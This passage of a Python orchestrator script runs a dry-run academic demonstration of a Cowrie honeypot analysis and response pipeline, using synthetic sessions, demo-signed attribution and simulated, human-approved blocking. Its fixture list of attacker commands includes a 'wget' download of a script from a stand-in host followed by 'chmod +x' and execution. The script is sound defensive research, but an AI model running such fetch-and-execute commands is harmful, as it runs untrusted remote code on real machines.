"""Academic demonstration orchestrator (Task 29B) - DEMONSTRATION ONLY, DRY-RUN ONLY.

Runs the existing ten-stage architecture as two architecturally distinct branches:

  ML branch    : Cowrie -> log collection (line-boundary slice) -> session reconstruction (scripts/parse_logs.py) ->
                 feature extraction (scripts/extract_features.py) -> DEC clustering (saved artifacts) -> pattern analysis ->
                 signature generation -> novelty assessment        [scripts/pipeline.py + the three analysis scripts]
  Rules branch : Cowrie events -> behavioural evidence -> threat scoring & rules (isolated container) ->
                 signed attribution -> dynamic response (dry-run) & feedback

Neither branch reads the other's outputs (no DEC/novelty influence on threat scoring: none exists in the implementation).

Trust: every key is an EPHEMERAL in-memory Ed25519 DEMO key (never written); only DEMO public keys and DEMO-labelled
config copies are written, to the existing assessment work folder - never to configs/. A Python audit hook records every
file this process opens; the run fails if any production config, private key, the live Cowrie log, Dataset V2 or sealed
data is opened. No enforcement, no witness, no D0/M0-M8, no service restart, no model refit.

  python reports/academic_demo_readiness_20261112/demo_orchestrator.py rehearse            # synthetic fixtures only
  python reports/academic_demo_readiness_20261112/demo_orchestrator.py print-live-commands  # shows the session commands
  python reports/academic_demo_readiness_20261112/demo_orchestrator.py live --cowrie-baseline N --relay-baseline M --approved
"""
import argparse
import hashlib
import json
import os
import secrets
import shutil
import subprocess
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO = HERE.parents[1]
OPENED = []


def _audit(event, args):
    if event == "open" and args and isinstance(args[0], (str, bytes, os.PathLike)):
        OPENED.append(os.fsdecode(args[0]))


sys.addaudithook(_audit)
sys.path.insert(0, str(REPO))

from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

from behavioural_evidence import EvidenceConfig, EvidenceEngine  # noqa: E402
from behavioural_evidence.calibration import load_calibration  # noqa: E402
from client_attribution import build_result, config_from_document, correlate, correlate_authentication, sign_result  # noqa: E402
from dynamic_response import (DisabledRelayEnforcement, ResponseAuditLog, ResponseController, annotate, metrics, outcomes,  # noqa: E402
                              response_policy_from_document, review_queue, verify_response_log)
from dynamic_response.approve_cli import build_approval, sign_approval  # noqa: E402
from dynamic_response.common import sha256_hex  # noqa: E402
from client_attribution.records import GENESIS, RECORD_SCHEMA, canonical  # noqa: E402
from threat_assessment import AttributionConfig, PolicyConfig, ThreatAssessor  # noqa: E402
from threat_assessment.audit import read_log  # noqa: E402
from threat_assessment.config import canonical_digest  # noqa: E402
from threat_assessment.signed_attribution import SignedResultError, verify_result  # noqa: E402
from session_exclusions import load_exclusions  # noqa: E402

LABEL = "DEMO ONLY - ephemeral in-memory key, not production trust"
WORK_IN, WORK_OUT = REPO / "cowrie" / "assessment_work" / "input", REPO / "cowrie" / "assessment_work" / "output"
CALIBRATION = REPO / "reports" / "behavioural_evidence_framework_implementation_20261111" / "config" / "sensor_calibration_lab_train.json"
EXCLUDED = {"99732d516898", "b806554e19b9", "9441bcce555c", "acc2bad4a442", "d588636ce120", "3eede5e19e25", "4542a85f37ec",
            "42ee73a7cbbd"}                                                       # + Task 29C live session (exclusions v2.0.0)
DEMO_EXCEPTION_SID = "42ee73a7cbbd"   # Task 29D: the only excluded session the assess-mode demonstration exception can ever admit
WATCHED = {"parse_logs.py": REPO / "scripts" / "parse_logs.py", "extract_features.py": REPO / "scripts" / "extract_features.py"}
RELAY, TEST_CLIENT, DEMO_LISTENER = "172.22.0.2", "10.250.25.3", "10.250.25.2:2222"
DEC_PYTHON = REPO / "ml" / "cowrie_dec_integration_skeleton" / ".venv-dec-smoke" / "Scripts" / "python.exe"
BASELINE = {"dec_results": REPO / "data/processed/dec_results.csv", "mapping": REPO / "data/processed/session_mapping.csv",
            "session_details": REPO / "data/parsed/session_details.json", "model_input": REPO / "data/processed/model_input.csv"}
COMMANDS = ["uname -a", "wget http://files.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"]

# Values copied from configs/address_safety_v1.json (1.0.0); embedded so that no production config file is read.
ADDRESS_SAFETY_DEMO = {
    "schema": "address-safety-config-1", "config_version": "1.0.0-DEMO", "note": LABEL,
    "protected_cidrs": ["127.0.0.0/8", "::1/128", "169.254.0.0/16", "fe80::/10", "172.19.0.0/16", "172.21.0.0/16", "172.22.0.0/16",
                        "10.250.25.1/32", "10.250.25.2/32"],
    "shared_source_cidrs": [], "enforcement_excluded_sources": ["10.250.25.4/32"], "enforcement_allowlist": ["10.250.25.3/32"]}
POLICY_CONDITIONS = {"min_finding_severity": "S2", "min_interpretation_evidence_level": "E2", "min_distinct_action_indicators": 2,
                     "require_successful_login": True, "require_attributable_source": True, "exclude_protected_and_shared_sources": True,
                     "require_verified_configuration_digests": True, "require_no_processing_errors": True, "require_authentication_event": True}


def iso(dt):
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def sha_file(p):
    return hashlib.sha256(Path(p).read_bytes()).hexdigest()


def demo_key(role):
    k = Ed25519PrivateKey.generate()
    pub = k.public_key()
    pem = pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    return {"role": role, "key": k, "pem": pem, "sha": hashlib.sha256(pub.public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)).hexdigest()}


class Run:
    def __init__(self, mode):
        self.mode, self.id = mode, datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ") + "-" + secrets.token_hex(3)
        self.created, self.checks, self.commands, self.subprocess_cmds = [], [], [], []
        self.out = WORK_OUT / f"demo-{self.id}"
        self.pre_input = sorted(p.name for p in WORK_IN.iterdir())
        self.pre_output = sorted(p.name for p in WORK_OUT.iterdir())

    def write(self, path, data):
        path = Path(path)
        if path.exists():
            raise RuntimeError(f"refusing to overwrite {path}")
        path.parent.mkdir(parents=True, exist_ok=True)
        (path.write_bytes if isinstance(data, bytes) else path.write_text)(data if isinstance(data, bytes) else data)
        self.created.append(path)
        return path

    def check(self, name, ok, detail=""):
        self.checks.append({"check": name, "pass": bool(ok), "detail": detail})
        print(("PASS " if ok else "FAIL ") + name + (f" - {detail}" if detail else ""))
        return ok

    def sh(self, cmd, **kw):
        self.subprocess_cmds.append([str(c) for c in cmd])
        return subprocess.run([str(c) for c in cmd], capture_output=True, text=True, **kw)


# ============================================================================================ fixtures
class RelayRecordWriterV1:
    """Same record format as the live attributing relay (relay-mapping-record-1), signed by the in-memory DEMO relay key."""

    def __init__(self, relay_key, clock_iso):
        self.key, self.key_id, self.clock_iso, self.seq, self.prev, self.lines = relay_key["key"], relay_key["sha"][:16], clock_iso, 0, GENESIS, []

    def write(self, rtype, **fields):
        self.seq += 1
        rec = {"schema": RECORD_SCHEMA, "seq": self.seq, "prev_hash": self.prev, "record_type": rtype, "written_utc": self.clock_iso(),
               "key_id": self.key_id, **fields}
        h = hashlib.sha256(canonical(rec).encode("utf-8")).hexdigest()
        rec["record_hash"], rec["signature"] = h, self.key.sign(h.encode("ascii")).hex()
        self.prev = h
        self.lines.append(canonical(rec))


def synthetic_fixture(now, relay_key):
    """A synthetic test-client relay session (fresh random session ID, never an excluded one) + its DEMO-signed relay records."""
    while True:
        sid = secrets.token_hex(6)
        if sid not in EXCLUDED:
            break
    uport, cport, t0 = 40000 + secrets.randbelow(20000), 30000 + secrets.randbelow(20000), now - timedelta(seconds=30)
    T = lambda s: iso(t0 + timedelta(seconds=s))                                         # noqa: E731
    base = {"session": sid, "src_ip": RELAY, "sensor": "SYNTHETIC-DEMO", "protocol": "ssh", "synthetic": True}
    ev = [dict(base, eventid="cowrie.session.connect", src_port=uport, dst_ip="172.22.0.1", dst_port=2222, timestamp=T(0.02),
               message=f"New connection: {RELAY}:{uport} (172.22.0.1:2222) [session: {sid}]"),
          dict(base, eventid="cowrie.client.version", version="SSH-2.0-Twisted_25.5.0", timestamp=T(0.05)),
          dict(base, eventid="cowrie.client.kex", timestamp=T(0.1)),
          dict(base, eventid="cowrie.login.success", username="demo", password="demo-pass", timestamp=T(0.5)),
          dict(base, eventid="cowrie.client.size", width=80, height=24, timestamp=T(1.0)),
          dict(base, eventid="cowrie.session.params", timestamp=T(1.05))]
    for k, line in enumerate(COMMANDS):
        ev.append(dict(base, eventid="cowrie.command.input", input=line, timestamp=T(3 + 1.5 * k)))
    ev.append(dict(base, eventid="cowrie.command.failed", input="./x.sh", timestamp=T(7.51)))
    ev.append(dict(base, eventid="cowrie.command.input", input="exit", timestamp=T(9)))
    ev.append(dict(base, eventid="cowrie.log.closed", size=838, duration=9.0, timestamp=T(9.01)))
    ev.append(dict(base, eventid="cowrie.session.closed", duration="9.0", timestamp=T(9.02)))
    clock = {"t": t0 - timedelta(seconds=5)}
    w = RelayRecordWriterV1(relay_key, lambda: iso(clock["t"]))
    w.write("relay_start", config_sha256="0" * 64, listeners=[{"name": "demo", "mode": "demo", "bind": "10.250.25.2", "port": 2222}], backend="cowrie:2222",
            public_key_sha256=relay_key["sha"], note=LABEL)
    clock["t"] = t0 + timedelta(seconds=0.01)
    w.write("connection_open", connection_id=str(uuid.uuid4()), listener="demo", listener_mode="demo", ingress_listener=DEMO_LISTENER,
            client_ip=TEST_CLIENT, client_port=cport, accepted_local=DEMO_LISTENER, accepted_utc=T(0), upstream_local_ip=RELAY,
            upstream_local_port=uport, upstream_peer="172.22.0.1:2222", upstream_connected_utc=T(0.01))
    cid = json.loads(w.lines[-1])["connection_id"]
    clock["t"] = t0 + timedelta(seconds=9.01)
    w.write("connection_close", connection_id=cid, listener="demo", client_ip=TEST_CLIENT, client_port=cport, upstream_local_ip=RELAY,
            upstream_local_port=uport, closed_utc=T(9.01), bytes_in=2152, bytes_out=11432)
    return sid, ev, w.lines


# ============================================================================================ DEMO configs
def demo_configs(relay_pin, result, approver, now, addr_path):
    addr = dict(ADDRESS_SAFETY_DEMO)
    a_digest = canonical_digest(addr)
    v3 = {"schema": "threat-attribution-config-3", "config_version": "3.0.0-DEMO", "note": LABEL, "source_field": "src_ip",
          "trusted_proxy_cidrs": ["172.22.0.2/32"], "relay_addresses": [RELAY], "internal_cidrs": ["172.21.0.0/16", "172.22.0.0/16"],
          "address_safety": {"path": addr_path, "config_version": addr["config_version"], "sha256_digest": a_digest},
          "proxy_client_mapping": {"verifier": "client_attribution", "public_key_sha256": relay_pin, "relay_upstream_addresses": [RELAY],
                                   "demo_listeners": [DEMO_LISTENER],
                                   "client_registry": {"10.250.25.3": {"role": "test_client"}, "10.250.25.4": {"role": "control_client"}},
                                   "correlation_skew_seconds": 2, "max_record_age_seconds": 86400,
                                   "key_validity": {"not_before": iso(now - timedelta(days=2)), "not_after": iso(now + timedelta(days=1))}},
          "attribution_result": {"verifier": "threat_assessment.signed_attribution", "schema": "signed-attribution-result-1", "status": "provisioned",
                                 "public_key_sha256": result["sha"], "public_key_path": None, "max_validity_seconds": 3600,
                                 "key_validity": {"not_before": iso(now - timedelta(hours=1)), "not_after": iso(now + timedelta(hours=12))},
                                 "status_note": LABEL},
          "excluded_diagnostic_sessions": ["99732d516898", "b806554e19b9"]}
    pol = {"schema_version": "2.1", "policy_name": "cowrie-defence-policy", "policy_version": "2.2.0-DEMO", "note": LABEL, "enforcement": "disabled",
           "manual_approval_required": True, "required_behavioural_evidence_catalogue": "v2-evidence-1.1",
           "attribution_config": {"path": "DEMO", "config_version": "3.0.0-DEMO", "sha256_digest": canonical_digest(v3)},
           "address_safety_config": {"path": addr_path, "config_version": addr["config_version"], "sha256_digest": a_digest},
           "tiers": ["abstain", "record", "review", "propose"], "proposal_conditions": dict(POLICY_CONDITIONS),
           "proposed_action": {"type": "block_source_ip", "scope": "this sensor only", "mode": "dry_run", "ttl_seconds": 86400, "inverse": "unblock_source_ip"}}
    resp = None if approver is None else {"schema": "response-policy-1", "config_version": "1.0.0-DEMO", "note": LABEL, "mode": "dry_run", "enforcement_activated": False,
            "action": "restrict_new_connections", "listener": "demo", "max_ttl_seconds": 900, "proposal_validity_seconds": 1800, "clock_skew_seconds": 5,
            "required_attribution": "attributable_via_proxy_mapping",
            "address_safety": {"path": addr_path, "config_version": addr["config_version"], "sha256_digest": a_digest},
            "approver_registry": {"status": "provisioned", "approvers": [{"name": "DEMO APPROVER (ephemeral)", "key_id": approver["sha"][:16],
                                                                         "public_key_sha256": approver["sha"], "public_key_pem": approver["pem"].decode(),
                                                                         "not_before": iso(now - timedelta(hours=1)), "not_after": iso(now + timedelta(hours=12))}]}}
    return addr, v3, pol, resp


CONTAINER_WRAPPER = '''"""DEMO wrapper: records every file opened inside the assessment container, by phase ('isolation_scan' = the
existing run_signed self-check that reads every repository file looking for private-key material; 'assessment' = everything
else), then runs threat_assessment.run_signed unchanged."""
import json, os, sys
phase, opened = ["startup"], {}
sys.addaudithook(lambda e, a: opened.setdefault(phase[0], set()).add(os.fsdecode(a[0]))
                 if e == "open" and a and isinstance(a[0], (str, bytes, os.PathLike)) else None)
sys.path.insert(0, "/opt/project")
from threat_assessment import run_signed
_scan = run_signed.isolation_report


def _phased_scan(*a, **k):
    phase[0] = "isolation_scan"
    try:
        return _scan(*a, **k)
    finally:
        phase[0] = "assessment"


run_signed.isolation_report = _phased_scan
out = sys.argv[sys.argv.index("--out-dir") + 1]
try:
    run_signed.main(sys.argv[1:])
finally:
    os.makedirs(out, exist_ok=True)
    json.dump({k: sorted(v) for k, v in opened.items()}, open(os.path.join(out, "opened_files.json"), "w"), indent=1)
'''


# ============================================================================================ branches
def ml_branch(run, raw_path):
    """Stages 2-8: existing pipeline on the slice only, then the three analysis scripts (baseline corpus for 6-7)."""
    d = run.out / "ml"
    p = run.sh([sys.executable, "scripts/pipeline.py", "--skip-attack", "--raw-input", raw_path, "--output-dir", d / "pipeline"], cwd=REPO)
    run.check("ML stages 2-5 (pipeline on the slice, DEC saved artifacts)", p.returncode == 0, (p.stdout + p.stderr).strip().splitlines()[-1] if p.returncode else "ok")
    dec = d / "pipeline" / "processed" / "dec_results.csv"
    run.check("ML handoff 4->5: behavior_features.csv -> DEC dec_results.csv", dec.exists(), str(dec.relative_to(REPO)) if dec.exists() else "missing")
    p = run.sh([sys.executable, "scripts/behaviour_pattern_analysis.py", "--dec-results", BASELINE["dec_results"], "--mapping", BASELINE["mapping"],
                "--session-details", BASELINE["session_details"], "--model-input", BASELINE["model_input"], "--output-dir", d / "behaviour_analysis"], cwd=REPO)
    run.check("ML stage 6 pattern analysis (baseline corpus)", p.returncode == 0, "ok" if p.returncode == 0 else p.stderr.strip()[-300:])
    ba = d / "behaviour_analysis"
    p = run.sh([sys.executable, "scripts/behaviour_signature_generation.py", "--cluster-summary", ba / "cluster_summary.csv", "--feature-stats",
                ba / "cluster_feature_statistics.csv", "--command-analysis", ba / "cluster_command_analysis.csv", "--session-profiles",
                ba / "session_behaviour_profiles.csv", "--session-details", BASELINE["session_details"], "--cluster-analysis", ba / "cluster_analysis.json",
                "--output-dir", d / "behaviour_signatures"], cwd=REPO)
    run.check("ML stage 7 signature generation (from stage-6 outputs)", p.returncode == 0, "ok" if p.returncode == 0 else p.stderr.strip()[-300:])
    p = run.sh([sys.executable, "scripts/novelty_assessment.py", "--session-details", d / "pipeline" / "parsed" / "session_details.json",
                "--signature-file", d / "behaviour_signatures" / "behaviour_signatures.json", "--output-dir", d / "novelty"], cwd=REPO)
    run.check("ML stage 8 novelty of the fresh session vs stage-7 signatures", p.returncode == 0, "ok" if p.returncode == 0 else p.stderr.strip()[-300:])
    res = {}
    try:
        import csv
        res["dec"] = list(csv.DictReader(open(dec, encoding="utf-8")))
        res["novelty"] = json.loads((d / "novelty" / "novelty_assessment_summary.json").read_text(encoding="utf-8"))
        res["novelty_rows"] = list(csv.DictReader(open(d / "novelty" / "novelty_assessment_results.csv", encoding="utf-8")))
        res["signatures"] = json.loads((d / "behaviour_signatures" / "signature_generation_summary.json").read_text(encoding="utf-8"))
    except Exception as exc:                                                  # noqa: BLE001
        res["error"] = str(exc)
    return res


def attribution_matches_evidence(run, sid, result, events, relay_lines):
    """The signed entry must restate exactly what the captured Cowrie events and the verified relay records say."""
    e = next((x for x in result["sessions"] if x["cowrie_session_id"] == sid), {})
    recs = {r.get("seq"): r for r in (json.loads(l) for l in relay_lines)}
    rr = e.get("relay_records") or {}
    op, cl = recs.get((rr.get("open") or {}).get("seq"), {}), recs.get((rr.get("close") or {}).get("seq"), {})
    ev = {}
    for x in events:
        if x["session"] == sid:
            ev.setdefault(x["eventid"], x)
    con, clo, log = ev.get("cowrie.session.connect", {}), ev.get("cowrie.session.closed", {}), ev.get("cowrie.login.success", {})
    ts, cl_, rc, au = e.get("timestamps") or {}, e.get("client") or {}, e.get("relay_to_cowrie") or {}, e.get("authentication") or {}
    rows = {
        "session ID": (e.get("cowrie_session_id"), sid),
        "client address (signed vs relay open record)": ((cl_.get("ip"), cl_.get("port")), (op.get("client_ip"), op.get("client_port"))),
        "client is the test client": (cl_.get("ip"), TEST_CLIENT),
        "source attribution decision": (e.get("decision"), "attributable_via_proxy_mapping"),
        "relay->Cowrie tuple (signed vs Cowrie connect)": ((rc.get("src_ip"), rc.get("src_port")), (con.get("src_ip"), con.get("src_port"))),
        "relay->Cowrie tuple (signed vs relay upstream)": ((rc.get("src_ip"), rc.get("src_port")), (op.get("upstream_local_ip"), op.get("upstream_local_port"))),
        "connection ID (signed, open, close)": ((rr.get("connection_id"), rr.get("connection_id")), (op.get("connection_id"), cl.get("connection_id"))),
        "relay record hashes (open, close)": (((rr.get("open") or {}).get("record_hash"), (rr.get("close") or {}).get("record_hash")),
                                              (op.get("record_hash"), cl.get("record_hash"))),
        "relay accepted time": (ts.get("relay_accepted_utc"), op.get("accepted_utc")),
        "relay upstream connected time": (ts.get("relay_upstream_connected_utc"), op.get("upstream_connected_utc")),
        "relay closed time": (ts.get("relay_closed_utc"), cl.get("closed_utc")),
        "Cowrie connect time": (ts.get("cowrie_connect_utc"), con.get("timestamp")),
        "Cowrie closed time": (ts.get("cowrie_closed_utc"), clo.get("timestamp")),
        "login success time (signed vs cowrie.login.success)": (au.get("login_success_utc"), log.get("timestamp")),
        "login state": (au.get("state"), "login_success_observed"),
        "close check": (e.get("close_check"), "consistent"),
    }
    table = {k: {"signed": a, "evidence": b, "match": a == b and a not in (None, (None, None))} for k, (a, b) in rows.items()}
    bad = [k for k, v in table.items() if not v["match"]]
    run.check("signed attribution matches the captured evidence (session, client, tuple, records, timestamps, login)", not bad,
              f"{len(table) - len(bad)}/{len(table)} fields match" + (f"; mismatched: {bad}" if bad else ""))
    return table


class SpyDisabledEnforcement(DisabledRelayEnforcement):
    """The unchanged disabled relay boundary, with every call attempt recorded before it raises."""

    def __init__(self):
        self.calls = []

    def stage_rule(self, rule):
        self.calls.append("stage_rule")
        return super().stage_rule(rule)

    def remove_rule(self, rule_id):
        self.calls.append("remove_rule")
        return super().remove_rule(rule_id)

    def active_rules(self):
        self.calls.append("active_rules")
        return super().active_rules()


def response_demo(run, sid, a, a_entries, adir, att, policy, resp, keys, result, relay_pin):
    """Task 29E: Dynamic Response & Feedback for a real assessment - DRY-RUN ONLY, every outcome SIMULATED. Uses the existing
    ResponseController; invalid inputs are submitted to the same controller first (rejected and logged, state unchanged)."""
    from dynamic_response.rules import TargetRejected, validate_target
    t0 = datetime.now(timezone.utc)
    T = lambda s: t0 + timedelta(seconds=s)                                              # noqa: E731
    out = {"label": "SIMULATED - dry-run only; no rule staged, no traffic altered, relay never contacted"}
    run.check("fresh DEMO-signed result is valid and unexpired at response time",
              ts_parse(result["issued_utc"]) <= t0 < ts_parse(result["not_after_utc"]), f"{result['result_id']} valid until {result['not_after_utc']}")
    if a["tier"] != "propose" or a["proposed_action"] is None:
        run.check("eligible proposal present (otherwise stop)", False, f"tier {a['tier']}: {a['tier_reason']}")
        return {**out, "stopped": f"no eligible proposal (tier {a['tier']})"}
    rpol = response_policy_from_document(resp)
    run.check("response policy is the isolated DEMO copy, dry-run, enforcement not activated, max TTL 900 s",
              rpol.mode == "dry_run" and resp["enforcement_activated"] is False and rpol.max_ttl_seconds == 900 and resp["config_version"].endswith("-DEMO"))
    audit_path = run.out / "response" / "response_audit.jsonl"
    audit_path.parent.mkdir(parents=True, exist_ok=True)
    relay = SpyDisabledEnforcement()
    ctl = ResponseController(rpol, att, policy, ResponseAuditLog(audit_path), relay=relay)
    assess_audit_before = sha_file(adir / "audit.jsonl")

    # ---- 1. proposal (attribution verification + proposal integrity happen inside build_proposal)
    r = ctl.intake(a, a_entries, T(0))
    run.check("1 valid proposal created from the verified assessment", r["accepted"], r.get("reason", ""))
    if not r["accepted"]:
        return {**out, "stopped": r["reason"]}
    p = r["proposal"]
    pid = p["proposal_id"]
    run.check("proposal: assessor action block_source_ip on 10.250.25.3 -> response action on exact target 10.250.25.3/32",
              p["source_proposal"]["type"] == "block_source_ip" and p["source_proposal"]["subject"] == TEST_CLIENT
              and p["action"]["target"] == f"{TEST_CLIENT}/32" and p["action"]["type"] == rpol.action and p["action"]["listener"] == "demo",
              f"{p['source_proposal']['type']} {p['source_proposal']['subject']} -> {p['action']['type']} {p['action']['target']} on listener {p['action']['listener']}")
    run.check("attribution verification: proposal bound to the accepted signed result and relay connection",
              p["attribution"]["result_id"] == result["result_id"] and p["attribution"]["client_ip"] == TEST_CLIENT
              and p["attribution"]["connection_id"] == a["proposed_action"]["relay_connection_id"] and p["session_ref"] == sid,
              f"{p['attribution']['result_id']} / {p['attribution']['connection_id']}")
    body = {k: v for k, v in p.items() if k != "proposal_hash"}
    run.check("proposal integrity: proposal_hash recomputes", sha256_hex(body) == p["proposal_hash"],
              p["proposal_hash"])
    run.check("maximum duration: proposal max TTL = 900 s (15 min), not the assessor's 86400 s",
              p["action"]["max_ttl_seconds"] == 900 and p["source_proposal"]["ttl_seconds"] == 86400)
    dup = ctl.intake(a, a_entries, T(0.5))
    run.check("duplicate prevention: second intake of the same assessment refused", not dup["accepted"], dup["reason"])
    tgt = {}
    for t in (f"{TEST_CLIENT}/32", "10.250.25.4/32", "172.22.0.2/32", "10.250.25.2/32", "10.250.25.0/28", "8.8.8.8/32"):
        try:
            tgt[t] = "allowed " + validate_target(t, att)
        except TargetRejected as exc:
            tgt[t] = "refused: " + str(exc)
    run.check("target allowlisting: only 10.250.25.3/32 is allowed (control client, relay, demo listener, subnet, outside address refused)",
              tgt[f"{TEST_CLIENT}/32"].startswith("allowed") and sum(v.startswith("allowed") for v in tgt.values()) == 1, json.dumps(tgt)[:220])

    # ---- 2. approval: invalid documents first (each must be refused; proposal stays 'proposed'), then the valid DEMO approval
    ak, aname = keys["approver"], "DEMO APPROVER (ephemeral)"
    rogue = demo_key("unregistered key (DEMO negative test)")

    def approval(ttl=600, decided=1.0, key=None, mutate=None, resign=None):
        doc = build_approval(p, "approve", aname, ak["sha"][:16], T(decided), ttl)
        if resign:
            resign(doc)
        doc = sign_approval(doc, (key or ak)["key"])
        if mutate:
            mutate(doc)
        return doc

    def retarget(d):
        d["rule"]["target"] = "10.250.25.4/32"

    def tamper_proposal(d):
        d["proposal_hash"] = "0" * 64

    neg = {"duration 901 s (> 15 min)": approval(ttl=901),
           "signed by an unregistered key": approval(key=rogue),
           "modified after signing (target -> control client)": approval(mutate=retarget),
           "re-signed with a different target": approval(resign=retarget),
           "refers to an altered proposal hash": approval(resign=tamper_proposal),
           "decision dated in the future": approval(decided=3600)}
    neg_res = {k: ctl.submit_decision(d, T(2)) for k, d in neg.items()}
    run.check("approval validation: every invalid approval refused, proposal still awaiting a decision",
              all(not v["accepted"] for v in neg_res.values()) and ctl.state(pid) == "proposed",
              "; ".join(f"{k}: {v['reason']}" for k, v in neg_res.items())[:400])
    good = approval(ttl=600)
    acc = ctl.submit_decision(good, T(2))
    run.check("2 human approval: DEMO approver signature verified, approved", acc["accepted"] and ctl.state(pid) == "approved", acc.get("reason", ""))
    rule = ctl.rules[pid]
    run.check("approval validity: rule window 600 s <= 900 s, created at decision time, unexpired at execution",
              rule["ttl_seconds"] == 600 and ts_parse(rule["created_utc"]) <= T(3) < ts_parse(rule["expires_utc"]), f"{rule['created_utc']} -> {rule['expires_utc']}")
    rep = ctl.submit_decision(good, T(2.5))
    run.check("replay prevention: the same approval document submitted again is refused", not rep["accepted"], rep["reason"])

    # ---- 3/4. controller validation + SIMULATED restriction
    enf = ctl.execute(pid, T(3), mode="enforce")
    run.check("3 controller refuses enforce mode", not enf["accepted"], enf["reason"])
    ex = ctl.execute(pid, T(3), mode="dry_run")
    run.check("4 SIMULATED restriction: dry-run accepted, nothing enforced", ex["accepted"] and ctl.state(pid) == "simulated", ex["reason"])
    dup_ex = ctl.execute(pid, T(3.5), mode="dry_run")
    run.check("duplicate execution refused", not dup_ex["accepted"], dup_ex["reason"])

    # ---- 5. operator verification (dry-run: no restriction expected; control unaffected)
    ev_ref = f"assessment/{run.id}: dry-run - no rule staged, relay not contacted (enforcement-call log empty)"
    v = {"verification_id": f"v-{run.id}", "proposal_id": pid, "kind": "response", "restriction_observed": False, "control_unaffected": True,
         "verified_utc": iso(T(4)), "operator": "DEMO OPERATOR", "evidence_ref": ev_ref, "result": "pass"}
    vr = ctl.record_verification(v, T(5))
    run.check("5 operator verification recorded: dry-run confirmed, no effect, control unaffected (SIMULATED)",
              vr["accepted"] and ctl.state(pid) == "verified_dry_run", vr["reason"])
    vrep = ctl.record_verification(v, T(5.5))
    run.check("replayed verification record refused", not vrep["accepted"], vrep["reason"])

    # ---- 6. SIMULATED rollback
    rv_ = ctl.revoke(pid, "DEMO OPERATOR", "end of demonstration", T(6))
    rb = dict(v, verification_id=f"rv-{run.id}", kind="rollback", verified_utc=iso(T(7)))
    rbr = ctl.record_rollback_verification(rb, T(8))
    run.check("6 SIMULATED rollback: revoked, rollback verified", rv_["accepted"] and rbr["accepted"] and ctl.state(pid) == "rolled_back", rbr["reason"])
    run.check("7 final response status: rolled_back (SIMULATED)", ctl.state(pid) == "rolled_back")
    run.check("disabled enforcement interface never called, still disabled",
              relay.calls == [] and relay.enabled is False and isinstance(relay, DisabledRelayEnforcement), f"calls={relay.calls}")

    # ---- feedback (existing implementation; response/feedback layer only)
    outs = outcomes(ctl.audit.entries)[pid]
    sim = next(e for e in ctl.audit.entries if e["event"] == "simulated")
    appr_e = next(e for e in ctl.audit.entries if e["event"] == "approval_recorded")
    ver_e = next(e for e in ctl.audit.entries if e["event"] == "verification_passed")
    rb_e = next(e for e in ctl.audit.entries if e["event"] == "rollback_verified")
    core = {"schema": "demo-feedback-record-1", "label": "SIMULATED (dry-run demonstration)", "session_id": sid,
            "threat_assessment": {"tier": a["tier"], "tier_reason": a["tier_reason"], "gates_all_true": all(a["gates"].values()),
                                  "assessment_record": p["assessment_audit"], "signed_result_id": result["result_id"], "signed_result_hash": result["result_hash"]},
            "proposal": {"proposal_id": pid, "proposal_hash": p["proposal_hash"], "action": p["action"], "source_proposal_type": p["source_proposal"]["type"]},
            "approval": {"decision": good["decision"], "approval_id": good["approval_id"], "approval_hash": good["approval_hash"],
                         "approver_key_id": good["approver"]["key_id"], "rule_id": rule["rule_id"], "ttl_seconds": rule["ttl_seconds"],
                         "audit_record_hash": appr_e["record_hash"]},
            "simulated_response": {"event": sim["event"], "enforced": sim["details"]["enforced"], "note": sim["details"]["note"], "audit_record_hash": sim["record_hash"]},
            "operator_verification": {"outcome": ver_e["details"]["outcome"], "verification_id": v["verification_id"], "audit_record_hash": ver_e["record_hash"]},
            "simulated_rollback": {"event": rb_e["event"], "audit_record_hash": rb_e["record_hash"]},
            "final_state": outs["final_state"], "response_success": outs["response_success"], "rejected_operations": outs["rejected_operations"],
            "enforcement_calls": relay.calls}
    core_hash = hashlib.sha256(canonical(core).encode("utf-8")).hexdigest()
    ann = annotate(ctl.audit, pid, "DEMO REVIEWER", "true_positive",
                   f"SIMULATED demo feedback; session {sid}; result {result['result_id']}; feedback core sha256 {core_hash}")
    linked = outcomes(ctl.audit.entries)[pid]
    run.check("feedback recorded with the existing implementation and linked to the response record",
              linked["labels"] and linked["labels"][-1]["label"] == "true_positive" and ann["proposal_id"] == pid, f"annotation {ann['record_hash'][:16]}")
    vlog = verify_response_log(ctl.audit.entries, ctl.audit.checkpoint())
    run.check("response/feedback audit log verifies (separate hash chain)", vlog["ok"], vlog["reason"])
    run.check("feedback stored only in the response layer: assessment audit log unchanged",
              sha_file(adir / "audit.jsonl") == assess_audit_before and audit_path.exists() and audit_path.parent != adir)
    record = {**core, "feedback_core_sha256": core_hash, "annotation": {"record_hash": ann["record_hash"], "label": "true_positive", "operator": "DEMO REVIEWER"},
              "response_audit_checkpoint": ctl.audit.checkpoint(), "metrics": metrics(ctl.audit.entries), "review_queue": review_queue(ctl.audit.entries)}
    run.write(run.out / "response" / "feedback_record.json", json.dumps(record, indent=2, default=str))
    run.write(run.out / "response" / "proposal.json", json.dumps(p, indent=2))
    run.write(run.out / "response" / "approval.json", json.dumps(good, indent=2))
    run.write(run.out / "response" / "approval_negative_tests.json", json.dumps({k: {"doc": neg[k], "result": neg_res[k]} for k in neg}, indent=2))
    return {**out, "proposal_id": pid, "proposal_hash": p["proposal_hash"], "action": p["action"], "source_proposal": p["source_proposal"],
            "target_checks": tgt, "approval_negative": {k: v["reason"] for k, v in neg_res.items()}, "approval_id": good["approval_id"],
            "rule": {k: rule[k] for k in ("rule_id", "target", "ttl_seconds", "created_utc", "expires_utc")}, "duplicate_intake": dup["reason"],
            "replayed_approval": rep["reason"], "enforce_mode": enf["reason"], "duplicate_execution": dup_ex["reason"], "replayed_verification": vrep["reason"],
            "execution": ex["reason"], "verification": vr["reason"], "rollback": rbr["reason"], "final_state": ctl.state(pid), "enforcement_calls": relay.calls,
